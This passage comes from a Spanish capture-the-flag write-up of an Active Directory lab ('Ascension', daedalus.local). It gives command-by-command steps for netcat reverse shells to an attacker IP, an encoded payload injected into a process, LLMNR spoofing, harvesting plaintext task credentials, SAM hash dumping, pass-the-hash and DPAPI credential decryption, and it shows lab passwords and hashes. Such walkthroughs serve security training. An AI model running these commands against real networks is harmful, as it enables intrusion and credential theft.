+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
+10.13.38.20 - - "GET / HTTP/1.1" 200 -</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Queremos ganar acceso, iniciamos descargando el <code class="language-plaintext highlighter-rouge">netcat.exe</code> en <code class="language-plaintext highlighter-rouge">C:\ProgramData</code> la cual es una ruta donde todos los usuarios siempre tienen capacidad de escritura</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ python3 </span><span class="p">exploit.py </span><span class="am">'curl 10.10.14.10/netcat.exe -o C:\ProgramData\netcat.exe'  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
+10.13.38.20 - - "GET /netcat.exe HTTP/1.1" 200 -</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente llamamos a <code class="language-plaintext highlighter-rouge">netcat.exe</code> y nos enviamos una <code class="language-plaintext highlighter-rouge">powershell</code>, esta la recibimos como el usuario <code class="language-plaintext highlighter-rouge">svc_dev</code> en web01, ahi podemos leer la primera flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ python3 </span><span class="p">exploit.py </span><span class="am">'cmd /c C:\ProgramData\netcat.exe -e powershell 10.10.14.10 443'  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.38.20
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\System32&gt; </span><span class="am">whoami</span><span class="p">
+web01\svc_dev
+PS C:\Windows\System32&gt; </span><span class="am">type </span><span class="p">C:\Users\svc_dev\Desktop\flag.txt  
+ASCENSION{y0ur_4gent_is_oUr_aG3n7}
+PS C:\Windows\System32&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag2">
+<br><h3 class="post-title">Intercept</h3>
+<h4 class="post-title">ASCENSION{N0_c0mm@nd_1s_saf3}</h4><br>
+
+<p class="plain-text">Usamos <a href="https://github.com/Kevin-Robertson/Inveigh">inveigh</a> para detectar trafico de todas peticiones que se hacen en esta red, en el output podemos encontrar algunas peticiones hacia <code class="language-plaintext highlighter-rouge">fin01.daedalus.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">curl </span><span class="p">10.10.14.10/Inveigh.ps1 </span><span class="c1">-o </span><span class="p">Inveigh.ps1
+PS C:\ProgramData&gt; </span><span class="am">Import-Module </span><span class="p">.\Inveigh.ps1
+PS C:\ProgramData&gt; </span><span class="am">Invoke-Inveigh </span><span class="c1">-FileOutput </span><span class="p">Y
+[*] Inveigh 1.506 started at 2023-09-02T22:06:41
+[+] Elevated Privilege Mode = Enabled
+[+] Primary IP Address = 10.13.38.20
+[+] Spoofer IP Address = 10.13.38.20
+[+] ADIDNS Spoofer = Disabled
+[+] DNS Spoofer = Enabled
+[+] DNS TTL = 30 Seconds
+[+] LLMNR Spoofer = Enabled
+[+] LLMNR TTL = 30 Seconds
+[+] mDNS Spoofer = Disabled
+[+] NBNS Spoofer = Disabled
+[+] SMB Capture = Enabled
+[+] HTTP Capture = Enabled
+[+] HTTPS Capture = Disabled
+[+] HTTP/HTTPS Authentication = NTLM
+[+] WPAD Authentication = NTLM
+[+] WPAD NTLM Authentication Ignore List = Firefox
+[+] WPAD Response = Enabled
+[+] Kerberos TGT Capture = Disabled
+[+] Machine Account Capture = Disabled
+[+] Console Output = Disabled
+[+] File Output = Enabled
+[+] Output Directory = C:\ProgramData
+Warning: [!] Run Stop-Inveigh to stop
+PS C:\ProgramData&gt; </span><span class="am">type </span><span class="p">Inveigh-Log.txt
+[+] [2023-09-02T22:06:49] mDNS(QM) request fin01.local received from 10.13.38.20 [spoofer disabled]
+[+] [2023-09-02T22:06:49] mDNS(QM) request fin01.local received from 10.13.38.20 [spoofer disabled]
+[+] [2023-09-02T22:06:50] NBNS request for FIN01&lt;20&gt; received from 192.168.10.39 [spoofer disabled]
+[+] [2023-09-02T22:06:50] NBNS request for FIN01&lt;20&gt; received from 192.168.10.39 [spoofer disabled]
+[+] [2023-09-02T22:06:50] DNS request for fin01.daedalus.local sent to 192.168.10.6 [outgoing query]  
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Puede que se trate de una tarea y aunque podriamos usar Seatbelt para enumerar las tareas antes necesitamos migrar a un proceso, para ello importamos <a href="https://github.com/EmpireProject/PSInject/">Invoke-PSInject</a></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">curl </span><span class="p">10.10.14.10/Invoke-PSInject.ps1 </span><span class="c1">-o </span><span class="p">Invoke-PSInject.ps1  
+PS C:\ProgramData&gt; </span><span class="am">Import-Module </span><span class="p">.\Invoke-PSInject.ps1
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora necesitamos un proceso, igual que en otros casos usaremos <code class="language-plaintext highlighter-rouge">RunTimeBroker</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">Get-Process </span><span class="p">RunTimeBroker
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    276      14     3348      15672       0.53   4992   1 RuntimeBroker  
+    341      18    20332      33492       2.02   5952   1 RuntimeBroker  
+    145       8     1764       7820       0.13   8184   1 RuntimeBroker  
+
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Crearemos un payload en <code class="language-plaintext highlighter-rouge">base64</code> que reutilizando el netcat nos envie una revshell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ echo </span><span class="p">-n</span><span class="am"> 'cmd /c C:\\ProgramData\\netcat.exe -e powershell 10.10.14.10 443'</span><span class="p"> | </span><span class="ve">iconv </span><span class="p">-t utf16le | </span><span class="ve">base64</span><span class="p"> -w0
+YwBtAGQAIAAvAGMAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABuAGUAdABjAGEAdAAuAGUAeABlACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANAAuADQAIAA0ADQAMwA=  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente ejecutamos en el pid <code class="language-plaintext highlighter-rouge">4992</code> que pertenece al proceso <code class="language-plaintext highlighter-rouge">RunTimeBroker</code> nuestro payload en <code class="language-plaintext highlighter-rouge">base64</code>, como resultado recibimos una nueva <code class="language-plaintext highlighter-rouge">powershell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">Invoke-PSInject </span><span class="c1">-Procid </span><span class="p">4992 </span><span class="c1">-PoshCode </span><span class="p">YwBtAGQAIAAvAGMAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABuAGUAdABjAGEAdAAuAGUAeABlACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANAAuADQAIAA0ADQAMwA=  
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.38.20
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\System32&gt; </span><span class="am">whoami</span><span class="p">
+web01\svc_dev
+PS C:\Windows\System32&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Bajo el contexto de este proceso si que podremos enumerar las tareas con <a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a>, encontramos una llamada <code class="language-plaintext highlighter-rouge">AutochkTask</code> la cual intenta cargar lo que hay en <code class="language-plaintext highlighter-rouge">\\fin01\invoices</code> sin embargo en el propio comando nos muestra <code class="language-plaintext highlighter-rouge">credenciales</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">curl </span><span class="p">10.10.14.10/Seatbelt.exe </span><span class="c1">-o </span><span class="p">Seatbelt.exe
+PS C:\ProgramData&gt; </span><span class="am">.\Seatbelt.exe </span><span class="p">ScheduledTasks
+
+
+                        %&amp;&amp;@@@&amp;&amp;                                                                                  
+                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%                         
+                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%  
+%%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((  
+#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((  
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((  
+#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((  
+#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####  
+###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####  
+#####%######################  %%%..                       @////(((&amp;%%%%%%%################                        
+                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*                         
+                        &amp;%%&amp;&amp;&amp;%%%%%        v1.2.1         ,(((&amp;%%%%%%%%%%%%%%%%%,                                 
+                         #%%%%##,                                                                                 
+
+====== ScheduledTasks ======
+
+Non Microsoft scheduled tasks (via WMI)
+
+  Name                              :   Server Initial Configuration Task
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   $(@%systemroot%\system32\SrvInitConfig.exe,-100)
+  Description                       :   $(@%systemroot%\system32\SrvInitConfig.exe,-101)
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   /disableconfigtask
+      Execute                       :   %windir%\system32\srvinitconfig.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskBootTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   AutochkTask
+  Principal                         :
+      GroupId                       :   
+      Id                            :   Author
+      LogonType                     :   1
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   svc_dev
+  Author                            :   DAEDALUS\Administrator
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/3/2020 3:34:29 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   net use E: \\fin01\invoices /user:billing_user D43d4lusB1ll1ngB055
+      Execute                       :   powershell
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTimeTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2020-01-13T04:13:47
+      Interval                      :   PT1M
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Antes de seguir crearemos un <code class="language-plaintext highlighter-rouge">proxy</code> para poder tener conexion con los equipos del dominio, para esto podemos usar <a href="https://github.com/nicocha30/ligolo-ng/">ligolo-ng</a> usando el <code class="language-plaintext highlighter-rouge">agent</code> para conectarnos a nuestro equipo por el puerto <code class="language-plaintext highlighter-rouge">8888</code> el cual podemos indicar en el <code class="language-plaintext highlighter-rouge">proxy</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">curl </span><span class="p">10.10.14.10/agent.exe </span><span class="c1">-o </span><span class="p">agent.exe
+PS C:\ProgramData&gt; </span><span class="am">.\agent.exe </span><span class="c1">-connect </span><span class="p">10.10.14.10:8888 </span><span class="c1">-ignore-cert  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el proxy obtenemos una <code class="language-plaintext highlighter-rouge">sesión</code>, la indicamos e iniciamos el tunel con <code class="language-plaintext highlighter-rouge">start</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ ,/proxy </span><span class="p">-selfcert -laddr 0.0.0.0:8888
+</span><span class="am">WARN</span><span class="p">[0000] Using automatically generated self-signed certificates (Not recommended) 
+</span><span class="az">INFO</span><span class="p">[0000] Listening on 0.0.0.0:8888                    
+</span><span class="am">    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+Made in France ♥ by @Nicocha30!
+
+ligolo-ng » 
+</span><span class="az">INFO</span><span class="p">[0076] Agent joined.           </span><span class="az">name</span><span class="p">="WEB01\\svc_dev@WEB01" </span><span class="az">remote</span><span class="p">="10.13.38.20:59528"  
+</span><span class="am">ligolo-ng » </span><span class="p">session
+</span><span class="ve">? </span><span class="p">Specify a session : </span><span class="az">1 - WEB01\svc_dev@WEB01 - 10.13.38.20:59528</span><span class="p">
+</span><span class="am">[Agent : WEB01\svc_dev@WEB01] » </span><span class="p">start
+</span><span class="az">INFO</span><span class="p">[0081] Starting tunnel to WEB01\svc_dev@WEB01       
+</span><span class="am">[Agent : WEB01\svc_dev@WEB01] »</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Agregamos el segmento <code class="language-plaintext highlighter-rouge">192.168.10.0/24</code> a la interfaz de <code class="language-plaintext highlighter-rouge">ligolo</code> y ahora tenemos conexión con todos los equipos del dominio, podemos comprobarlo con un ping</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo ip </span><span class="p">route add 192.168.10.0/24 dev ligolo
+
+</span><span class="ve">❯ ping </span><span class="p">-c1 -w1 192.168.10.39
+PING 192.168.10.39 (192.168.10.39) 56(84) bytes of data.
+64 bytes from 192.168.10.39: icmp_seq=1 ttl=64 time=177 ms
+
+--- 192.168.10.39 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms  
+rtt min/avg/max/mdev = 176.552/176.552/176.552/0.000 ms</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> usaremos un <code class="language-plaintext highlighter-rouge">/24</code> para escanear todo el segmento, detectamos 2 equipos asociados al dominio <code class="language-plaintext highlighter-rouge">daedalus.local</code> y sus nombres son <code class="language-plaintext highlighter-rouge">WEB01</code> y <code class="language-plaintext highlighter-rouge">DC1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.10.0/24
+</span><span class="az">SMB         </span><span class="p">192.168.10.39   445    WEB01            </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">192.168.10.6    445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Por comodidad y posibles proximos ataques agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> las direcciones con su <code class="language-plaintext highlighter-rouge">dominio</code> que sera el <code class="language-plaintext highlighter-rouge">hostname</code> y el dominio <code class="language-plaintext highlighter-rouge">daedalus.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ echo </span><span class="am">"192.168.10.39 web01.daedalus.local" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts
+
+</span><span class="ve">❯ echo </span><span class="am">"192.168.10.6 daedalus.local dc1.daedalus.local" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos las credenciales que encontramos en la tarea hacia el DC y son validas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc1.daedalus.local -u billing_user -p D43d4lusB1ll1ngB055
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">daedalus.local\billing_user:D43d4lusB1ll1ngB055</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volviendo a <code class="language-plaintext highlighter-rouge">WEB01</code>, si miramos los administradores locales encontramos al usuario <code class="language-plaintext highlighter-rouge">billing_user</code> a nivel de dominio, y este usuario es de quien tenemos la contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">net </span><span class="p">localgroup Administrators
+
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain  
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+DAEDALUS\billing_user
+DAEDALUS\Domain Admins
+The command completed successfully.
+
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente comprobamos con crackmapexec pero hacia <code class="language-plaintext highlighter-rouge">WEB01</code> y nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> por lo que tenemos privilegios maximos, asi que podemos dumpear la <code class="language-plaintext highlighter-rouge">sam</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb web01.daedalus.local -u billing_user -p D43d4lusB1ll1ngB055
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="ve">[+] </span><span class="p">daedalus.local\billing_user:D43d4lusB1ll1ngB055 </span><span class="am">(Pwn3d!)
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb web01.daedalus.local -u billing_user -p D43d4lusB1ll1ngB055 --sam
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="ve">[+] </span><span class="p">daedalus.local\billing_user:D43d4lusB1ll1ngB055 </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="az">[*] </span><span class="p">Dumping SAM hashes
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:568c606ed9511b9a10d7d026322e8521:::
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="am">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:fb3ada79aa86ea85ffc477a12c27bea2:::
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="am">svc_dev:1003:aad3b435b51404eeaad3b435b51404ee:c052d2a19169ce31d0b80ce67114a74e:::
+</span><span class="az">SMB         </span><span class="p">web01.daedalus.local 445    WEB01            </span><span class="ve">[+] </span><span class="p">Added </span><span class="am">5 </span><span class="p">SAM hashes to the database</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con el hash del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> haciendo un passthehash y obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code> donde leemos la flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm </span><span class="p">-i web01.daedalus.local -u Administrator -H 568c606ed9511b9a10d7d026322e8521  
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
+web01\administrator
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+ASCENSION{N0_c0mm@nd_1s_saf3}
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag3">
+<br><h3 class="post-title">Contrails</h3>
+<h4 class="post-title">ASCENSION{15nT_dPaP1_s3cuRe?}</h4><br>
+
+<p class="plain-text">Subimos <a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a> para dumpear credenciales, para ello le pasearemos la contraseña que tenemos, asi obtenemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">svc_backup</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">upload </span><span class="p">SharpDPAPI.exe
+</span><span class="az">
+Info: Uploading SharpDPAPI.exe to C:\Users\Administrator\Documents\SharpDPAPI.exe
+</span><span class="sa">
+Data: 202752 bytes of 202752 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">.\SharpDPAPI.exe </span><span class="p">credentials /password:D43d4lusB1ll1ngB055  
+
+  __                 _   _       _ ___
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                |
+  v1.11.3
+
+
+[*] Action: User DPAPI Credential Triage
+
+[*] Will decrypt user masterkeys with password: D43d4lusB1ll1ngB055
+
+[*] Triaging Credentials for ALL users
+
+Folder       : C:\Users\Administrator\AppData\Local\Microsoft\Credentials\
+
+  CredFile           : 6C0FA35116FC27371A650B528FAEE6C0
+
+    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
+    size             : 560
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Local Credential Data
+
+    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}
+
+Folder       : C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\
+
+  CredFile           : C48FA9BC4637C67CB306A191C3C91E23
+
+    guidMasterKey    : {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}
+    size             : 430
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+    description      : Enterprise Credential Data
+
+    LastWritten      : 10/14/2020 5:35:22 AM
+    TargetName       : Domain:interactive=DAEDALUS\svc_backup
+    TargetAlias      :
+    Comment          :
+    UserName         : DAEDALUS\svc_backup
+    Credential       : jkQXAnHKj#7w#XS$
+
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+
+<p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y son credenciales validas a nivel de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc1.daedalus.local -u svc_backup -p jkQXAnHKj#7w#XS$
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">daedalus.local  445    DC1              </span><span class="ve">[+] </span><span class="p">daedalus.local\svc_backup:jkQXAnHKj#7w#XS$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para enumerar un poco el dominio usaremos <code class="language-plaintext highlighter-rouge">bloodhound</code>, nos autenticaremos con las credenciales de svc_backup y toda la informacion la guardamos en un <code class="language-plaintext highlighter-rouge">zip</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ bloodhound-python </span><span class="p">-u svc_backup -p jkQXAnHKj#7w#XS$ -ns 192.168.10.6 -d daedalus.local -c All --zip  
+INFO: Found AD domain: daedalus.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc1.daedalus.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to GC LDAP server: dc1.daedalus.local
+INFO: Connecting to LDAP server: dc1.daedalus.local
+INFO: Found 7 users
+INFO: Found 52 groups
+INFO: Found 2 gpos
+INFO: Found 7 ous
+INFO: Found 19 containers
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: WEB01.daedalus.local
+INFO: Querying computer: DC1.daedalus.local
+INFO: Done in 00M 34S
+INFO: Compressing output into 20230901100806_bloodhound.zip</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de subir el zip a <code class="language-plaintext highlighter-rouge">bloodhound</code> encontramos el usuario <code class="language-plaintext highlighter-rouge">svc_backup</code> que pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> asi que se puede conectar a winrm</p>
+<a href="/endgames/ascension/22.png" target="_blank"><div><p><img src="/endgames/ascension/22.png"></p></div></a>
+
+<p class="plain-text">Simplemente nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> como el usuario svc_backup hacia el equipo <code class="language-plaintext highlighter-rouge">DC1</code> y obtenemos una powershell donde podemos leer una nueva flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm</span><span class="p"> -i dc1.daedalus.local -u svc_backup -p jkQXAnHKj#7w#XS$  
+PS C:\Users\svc_backup.DAEDALUS\Documents&gt; </span><span class="am">whoami</span><span class="p">
+daedalus\svc_backup
+PS C:\Users\svc_backup.DAEDALUS\Documents&gt; </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+ASCENSION{15nT_dPaP1_s3cuRe?}
+PS C:\Users\svc_backup.DAEDALUS\Documents&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag4">
+<br><h3 class="post-title">Wingman</h3>
+<h4 class="post-title">ASCENSION{0G_adm1ni5tR@tor}</h4><br>
+
+<p class="plain-text">Podemos usar <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas.exe</a> para enumerar la maquina, lo subimos y lo ejecutamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\svc_backup.DAEDALUS\Documents&gt; </span><span class="am">upload </span><span class="p">winpeas.exe
+</span><span class="az">
+Info: Uploading winpeas.exe to C:\Users\svc_backup.DAEDALUS\Documents\winpeas.exe  
+</span><span class="sa">
+Data: 3166888 bytes of 3166888 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\svc_backup.DAEDALUS\Documents&gt; </span><span class="am">.\winpeas.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entre la informacion que nos detecta encontramos otra unidad logica que es la <code class="language-plaintext highlighter-rouge">E:</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="az">ÉÍÍÍÍÍÍÍÍÍÍ¹ </span><span class="ve">Drives Information
